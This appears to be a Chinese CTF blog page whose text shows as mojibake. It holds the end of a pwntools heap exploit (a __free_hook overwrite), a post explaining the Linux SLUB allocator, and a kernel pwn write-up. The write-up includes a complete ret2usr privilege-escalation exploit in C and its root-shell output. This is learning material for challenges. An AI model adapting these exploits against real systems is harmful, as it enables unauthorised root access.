sh.recvuntil(<span class="string">&quot;Good Job! Here is your reward! &quot;</span>)</span><br><span class="line">    m=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">nptr_add</span>(<span class="params">nptr</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>)</span><br><span class="line">    sh.send(<span class="built_in">str</span>(nptr))</span><br><span class="line"></span><br><span class="line">duan=<span class="string">&#x27;b *(0x7ffff7fc2000+&#123;0&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="number">0x1E45</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0xa0</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0x350</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">3</span>,<span class="number">0xa0</span>)</span><br><span class="line">    add_student(<span class="number">1</span>)</span><br><span class="line">    write_review(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">1</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">2</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">3</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_id(<span class="number">4</span>)</span><br><span class="line">    pray()</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    give_sorce()</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    heap_base=get_addr()-<span class="number">0x2a0</span></span><br><span class="line">    nptr_add(heap_base+<span class="number">0x549</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_id(<span class="number">1</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    get_addr()</span><br><span class="line">    nptr_add(heap_base+<span class="number">0x441</span>)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    free_malloc=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    change_id(<span class="number">3</span>)</span><br><span class="line">    check_review()</span><br><span class="line">    get_addr()</span><br><span class="line">    nptr_add(heap_base+<span class="number">0x8f1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    pay=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xa0</span>+p64(<span class="number">0x460</span>)+p64(<span class="number">0x30</span>)+p64(heap_base+<span class="number">0x9e0</span>)</span><br><span class="line">    pay+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0xfffffff700000001</span>)</span><br><span class="line">    pay+=p64(free_malloc)+p64(<span class="number">0x20</span>)</span><br><span class="line">    write_review(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0x1a0</span>,pay)</span><br><span class="line">    write_review(<span class="number">1</span>,<span class="number">4</span>,<span class="number">0x20</span>,p64(libc_base+<span class="number">0xe3b31</span>))</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x4-æ€»ç»“"><a href="#0x4-æ€»ç»“" class="headerlink" title="0x4 æ€»ç»“"></a>0x4 æ€»ç»“</h2><p>æ„Ÿè§‰è‡ªå·±æœ‰ç‚¹æµäºå½¢å¼äº†ï¼Œåœ¨çœ‹pwn1çš„æ—¶å€™ä¸€çœ‹åˆ°callocå°±æƒ³ç€æ€ä¹ˆç»•è¿‡ï¼Œå®Œå…¨æ²¡è€ƒè™‘ç¨‹åºæœ¬èº«ï¼Œå“ï¼Œæ‰€ä»¥æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œç°åœ¨çœ‹æ¥æ˜¯ä¸€é“æ¯”è¾ƒç®€å•çš„é¢˜ï¼Œæ‰€ä»¥ä¸€åˆ‡éƒ½è¦ä»¥ç¨‹åºä¸ºæœ¬ï¼Œåˆ‡è®°åˆ‡è®°ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/08/slub-slab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/08/slub-slab/" class="post-title-link" itemprop="url">slub/slab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-08 17:20:10 / ä¿®æ”¹æ—¶é—´ï¼š17:20:35" itemprop="dateCreated datePublished" datetime="2022-04-08T17:20:10+08:00">2022-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwn-slub-slab"><a href="#kernelpwn-slub-slab" class="headerlink" title="kernelpwn slub/slab"></a>kernelpwn slub/slab</h1><p>æ€»ç»“ä¸€æ³¢å†…æ ¸åˆ†é…å†…å­˜ï¼ˆå †ï¼‰çš„ç­–ç•¥ï¼Œä¸ç„¶åšå†…æ ¸é¢˜æ€»æ˜¯åŠæ‡‚ä¸æ‡‚çš„ã€‚</p>
<p>å†…æ ¸ç®¡ç†å†…å­˜é¡µé¢ä½¿ç”¨äº†ä¸¤ç§ç®—æ³•ï¼Œä¼™ä¼´ç®—æ³•å’Œslubç®—æ³•</p>
<h2 id="ä¼™ä¼´ç®—æ³•"><a href="#ä¼™ä¼´ç®—æ³•" class="headerlink" title="ä¼™ä¼´ç®—æ³•"></a>ä¼™ä¼´ç®—æ³•</h2><p>ä¼™ä¼´ç®—æ³•æ˜¯ä»¥é¡µ4kä¸ºå•ä½ç®¡ç†å†…å­˜çš„ï¼Œä¹Ÿå°±æ˜¯ç”³è¯·å’Œé‡Šæ”¾çš„æœ€å°å•ä½æ˜¯4kï¼Œä½†æ˜¯ç¨‹åºå¤šæ•°æƒ…å†µä¸‹ä¸ä¼šç”³è¯·è¿™ä¹ˆå¤§çš„å†…å­˜ï¼Œè€Œæ˜¯æ¯”è¾ƒå°çš„å†…å­˜ï¼Œå°±åƒç”¨æˆ·æ€çš„å †ä¸€æ ·ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸€ä¸ªå†…å­˜ç®¡ç†ç®—æ³•æ”¯æŒè¿™ç§åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯slubç®—æ³•</p>
<h2 id="slub"><a href="#slub" class="headerlink" title="slub"></a>slub</h2><p>åƒlibcç”³è¯·é‡Šæ”¾å †å—ä¸€æ ·ï¼Œslubä¹ŸæŠŠå †è¿›è¡Œè¿›è¡Œäº†åˆ†ç»„ç®¡ç†ï¼Œæ¯ä¸€ç»„çš„å¤§å°æ˜¯2^3,2^4â€¦.2^11å­—èŠ‚ï¼Œå †çš„å¤§å°æ˜¯ä»¥8å­—èŠ‚é€’å¢çš„ï¼Œä¹Ÿå°±æ˜¯(8,2048),å½“è¶…è¿‡2048çš„æ—¶å€™å°±ä¼šä½¿ç”¨ä¼™ä¼´ç³»ç»Ÿæä¾›çš„æ¥å£ç›´æ¥ç”³è¯·ä¸€ä¸ªå®Œæ•´çš„é¡µé¢ï¼Œè¿˜æœ‰ä¸¤ä¸ªç‰¹æ®Šçš„ç»„96å­—èŠ‚å’Œ192å­—èŠ‚ï¼Œè¿™äº›ç»„æ˜ å°„åˆ°kmalloc_caches[12]æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ </p>
<p><img src="https://img.lhyerror404.cn/error404/2020-03-22-144151.png" alt="img"></p>
<p>è¿™æ˜¯ç”¨äºslubç®¡ç†å†…å­˜çš„æ•°æ®ç»“æ„ï¼Œå¯ä»¥çœ‹è§æ¯ä¸ªkmalloc_cacheså…ƒç´ åˆå„ç§å¯¹åº”ä¸€ä¸ªkmem_cacheç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“ä¸­åˆèƒ½æŒ‡å‘<code>kmem_cache_cpu</code>å’Œ<code>kmem_cache_node</code>ä¸¤ä¸ªæ•°ç»„ï¼Œè¿™ä¸¤ä¸ªç»“æ„ä½“æ‰æ˜¯slubåˆ†é…ç®—æ³•çš„å…³é”®</p>
<p>æœ‰ä¸€ä¸ªåšå®¢æ¯”å–»çš„å¾ˆå¥½ï¼Œ<code>kmem_cache_node</code>ç›¸å½“äºä»“åº“ï¼Œ<code>kmem_cache_cpu</code>æ˜¯çœŸæ­£ç”¨äºåˆ†é…å†…å­˜çš„åœ°æ–¹ï¼Œæ¯ä¸ªkmalloc_cacheså…ƒç´ éƒ½æœ‰è‡ªå·±çš„<code>kmem_cache_cpu</code>å’Œ<code>kmem_cache_node</code>ã€‚</p>
<h3 id="kmem-cache-cpuå’Œkeme-cache-node"><a href="#kmem-cache-cpuå’Œkeme-cache-node" class="headerlink" title="kmem_cache_cpuå’Œkeme_cache_node"></a>kmem_cache_cpuå’Œkeme_cache_node</h3><p>slubä¼šæ ¹æ®è¿™ä¸ªç»„çš„å¤§å°å‘ä¼™ä¼´ç®—æ³•ç”³è¯·æ•´æ•°å€4kçš„å†…å­˜ç»™kmem_cache_cpu,ç”³è¯·åˆ°è¿™å—å†…å­˜å«åšslab,å…¶ä¸­kmem_cache_cpu.pageå°±æŒ‡å‘äº†slabçš„é¦–åœ°å€ï¼Œslubä¼šæ ¹æ®è¿™ä¸ªç»„çš„å¤§å°æŠŠslabåˆ‡å‰²æˆå¾ˆå¤šä¸ªå°çš„object,æ¯ä¸ªobjectçš„å¤§å°å°±æ˜¯è¿™ä¸ªç»„çš„å¤§å°ï¼Œå½“objectè¿˜æœªè¢«ç”³è¯·æ—¶å€™ä¼šæœ‰å…«ä¸ªå­—èŠ‚å‚¨å­˜ä¸‹ä¸€ä¸ªobjectçš„åœ°å€ï¼Œè¿™æ ·å…¶å®è¿™ä¸ªslabå°±è¢«åˆ‡å‰²æˆå¤§å°ç›¸ç­‰çš„å•å‘é“¾è¡¨äº†ï¼Œç„¶åkmem_cache_cpu.freelistæŒ‡å‘è¿™ä¸ªslabçš„ç¬¬ä¸€ä¸ªç©ºé—²object</p>
<p><img src="http://hi.csdn.net/attachment/201111/7/0_1320655427Rtw3.gif" alt="img"></p>
<p>å½“ç”³è¯·è¿™ä¸ªç»„çš„å†…å­˜çš„æ—¶å€™å¦‚æœè¿™ä¸ªç»„çš„kmem_cache_cpuæ²¡æœ‰ä¸€ä¸ªslabçš„æ—¶å€™ï¼Œslubå°±ä¼šç”³è¯·ä¸€ä¸ªslabå¹¶æ‰§è¡Œä¸Šè¿°æ“ä½œï¼Œç„¶åæŠŠç¬¬ä¸€ä¸ªobjæ ‡è®°ä¸ºå ç”¨å¹¶è¿”å›ç»™ç”¨æˆ·ï¼Œä¸‹å›¾ä½“ç°äº†è¿™ä¸ªæ“ä½œï¼Œç”³è¯·äº†ä¸€ä¸ªobjectä»¥åkmem_cache_cpuå°±ä¼šæ ¹æ®è¿™ä¸ªobjectçš„nextæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²objectã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220407214835446.png" alt="image-20220407214835446"></p>
<p>è‡³äºä¸ºä»€ä¹ˆè¯´kmem_cache_cpuä¸ºä»€ä¹ˆæ˜¯å†…å­˜ç”³è¯·çš„ä¸»è¦åœ°æ–¹ç°åœ¨å°±å¾ˆæ˜æœ—äº†ã€‚</p>
<p>å¯æ˜¯kmem_cache_cpuæŒ‡å‘çš„slabæ€»æœ‰ç”¨å®Œçš„æ—¶å€™ï¼Œå½“è¿™ä¸ªslabç”¨å®Œæ€ä¹ˆåŠï¼Œè¿™æ—¶å€™å°±å¾—ç”¨ä¸Š<code>kmem_cache_node</code>è¿™ä¸ªç»“æ„ä½“ä»“åº“äº†ï¼Œkmem_cache_nodeæœ‰ä¸¤ä¸ªæŒ‡é’ˆ<code>partial</code>å’Œ<code>full</code>æŒ‡å‘ä¸¤ä¸ªé“¾è¡¨ï¼Œå…¶ä¸­partialæŒ‡å‘æœ‰ç©ºé—²objçš„slabé“¾è¡¨ï¼ŒfullæŒ‡å‘æ²¡æœ‰ç©ºé—²çš„slabé“¾è¡¨ï¼Œå¦‚ä¸‹å›¾</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220407220144459.png" alt="image-20220407220144459"></p>
<p>å½“keme_cache_cpuæŒ‡å‘çš„slabç”¨å®Œåå°±ä¼šæ”¾åˆ°kmem_cache_node.fullä¸Šé¢ï¼Œç„¶åæ£€æŸ¥keme_cache_partialé“¾è¡¨æœ‰æ²¡æœ‰æœ‰ç©ºé—²çš„slab,å¦‚æœæœ‰çš„è¯å°±ä¼šæŠŠç¬¬ä¸€ä¸ªç©ºé—²çš„objè¿”å›ç»™ç”¨æˆ·ï¼Œç„¶åæŠŠè¿™ä¸ªslabç»™kmem_cache_cpuã€‚</p>
<p>å¦‚æœkmem_cache_node.fullä¸Šé¢çš„ä¸€ä¸ªslabçš„ä¸€ä¸ªobjè¢«é‡Šæ”¾åè¿™ä¸ªslabå°±ä¼šç§»å‘partialã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™æ˜¯slubç®—æ³•çš„ä¸»è¦ç­–ç•¥ï¼Œä¸æ¶‰åŠæºç è§£è¯»ï¼ˆå› ä¸ºçœ‹ä¸æ‡‚ï¼‰ï¼Œå…ˆå­¦ç€çœ‹ï¼Œä»¥åå¦‚æœæœ‰å¿…è¦ä¼šçœ‹çœ‹ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/08/kernelpwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-md/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/08/kernelpwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-md/" class="post-title-link" itemprop="url">kernelpwnåˆ·é¢˜è®°å½•.md</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-08 17:19:04 / ä¿®æ”¹æ—¶é—´ï¼š17:19:26" itemprop="dateCreated datePublished" datetime="2022-04-08T17:19:04+08:00">2022-04-08</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelpwnåˆ·é¢˜è®°å½•"><a href="#kernelpwnåˆ·é¢˜è®°å½•" class="headerlink" title="kernelpwnåˆ·é¢˜è®°å½•"></a>kernelpwnåˆ·é¢˜è®°å½•</h1><h2 id="0x1-level1"><a href="#0x1-level1" class="headerlink" title="0x1 level1"></a>0x1 level1</h2><h3 id="0x1-1-boot-sh"><a href="#0x1-1-boot-sh" class="headerlink" title="0x1.1 boot.sh"></a>0x1.1 boot.sh</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">&#x27;console=ttyS0 loglevel=3 oops=panic panic=1 nokaslr&#x27;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>noksalr,nosmep,nosmap</p>
<h3 id="0x1-2-init"><a href="#0x1-2-init" class="headerlink" title="0x1.2 init"></a>0x1.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/baby</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"></span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>æ²¡æœ‰å¯¹proc/kallsymsä¿æŠ¤</p>
<h3 id="0x1-3-baby-ko"><a href="#0x1-3-baby-ko" class="headerlink" title="0x1.3 baby.ko"></a>0x1.3 baby.ko</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD v5[<span class="number">17</span>]; <span class="comment">// [rsp-88h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0x6001</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  v5[<span class="number">16</span>] = v2;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)copy_from_user(v5, v3, <span class="number">256LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æœ‰æ ˆæº¢å‡ºï¼Œç›´æ¥ret2usr,ä½¿ç”¨kallsymsæŸ¥çœ‹å‡½æ•°åœ°å€çš„æ—¶å€™å‘ç°åœ°å€å…¨ä¸º0ï¼Œç™¾åº¦åå‘ç°æ˜¯å†…æ ¸çš„ä¸€ç§ä¿æŠ¤æªæ–½ï¼Œåªæœ‰rootç”¨æˆ·èƒ½å¤Ÿç›´æ¥æŸ¥çœ‹kallsymsï¼Œæ‰€ä»¥æœ¬åœ°è°ƒè¯•çš„æ—¶å€™æŠŠç”¨æˆ·æƒé™æ”¹å¤§å°±å¥½</p>
<p>æå–vmlinuxçš„å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">/usr/src/linux-headers-$</span><span class="bash">(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span></span><br><span class="line">objdump -d vmlinux &gt; gadget</span><br></pre></td></tr></table></figure>

<h3 id="0x1-4-exp"><a href="#0x1-4-exp" class="headerlink" title="0x1.4 exp"></a>0x1.4 exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0xffffffff810b9d80</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0xffffffff810b99d0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">     (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_pop_rbp_ret=<span class="number">0xffffffff81070834</span>;</span><br><span class="line">    <span class="keyword">size_t</span> iretq=<span class="number">0xffffffff81036a5b</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[<span class="number">17</span>]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    rop[<span class="number">18</span>]=swapgs_pop_rbp_ret;</span><br><span class="line">    rop[<span class="number">20</span>]=iretq;</span><br><span class="line">    rop[<span class="number">21</span>]=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line">    rop[<span class="number">22</span>] = user_cs;</span><br><span class="line">    rop[<span class="number">23</span>] = user_rflags;</span><br><span class="line">    rop[<span class="number">24</span>] = user_sp;</span><br><span class="line">    rop[<span class="number">25</span>] = user_ss;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] bad open\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(fd,<span class="number">0x6001</span>,rop);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ææƒæˆåŠŸ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[*]status has ben saved.</span><br><span class="line">/ # id</span><br><span class="line">uid=0(root) gid=0</span><br></pre></td></tr></table></figure>

